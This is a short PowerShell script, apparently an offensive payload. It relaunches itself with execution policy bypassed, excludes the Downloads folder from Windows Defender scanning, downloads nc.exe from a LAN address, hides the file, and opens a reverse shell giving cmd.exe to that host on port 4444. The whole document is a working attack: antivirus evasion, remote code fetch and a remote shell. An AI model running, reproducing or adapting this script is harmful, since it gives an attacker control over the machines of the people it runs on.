function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$script`""
        exit
    }
}

Ensure-WindowsPowerShell

try {
    # === Exclude Downloads from Defender scanning ===
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    # === Download nc.exe from LAN (192.168.0.103) ===
    $ncUrl = "http://192.168.0.103/nc.exe"
    $ncPath = "$env:USERPROFILE\Downloads\nc.exe"

    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing

    Unblock-File -Path $ncPath
    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

    # === Execute reverse shell to 192.168.0.103:4444 ===
    & "$ncPath" "192.168.0.103" 4444 -e cmd.exe
}
catch {
    Write-Error "Execution failed: $_"
}
